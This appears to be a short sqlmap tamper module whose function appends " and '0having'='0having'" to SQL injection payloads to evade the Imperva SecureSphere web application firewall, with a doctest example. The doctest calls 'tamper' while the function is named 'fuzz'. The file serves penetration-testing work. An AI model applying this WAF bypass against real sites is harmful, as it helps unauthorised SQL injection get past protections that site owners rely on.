#!/usr/bin/env python

"""
Copyright (c) 2006-2017 sqlmap developers (http://sqlmap.org/)
See the file 'doc/COPYING' for copying permission
"""


def fuzz(payload, **kwargs):
    """
    Appends special crafted string

    Notes:
        * Useful for bypassing Imperva SecureSphere WAF
        * Reference: http://seclists.org/fulldisclosure/2011/May/163

    >>> tamper('1 AND 1=1')
    "1 AND 1=1 and '0having'='0having'"
    """

    return payload + " and '0having'='0having'" if payload else payload
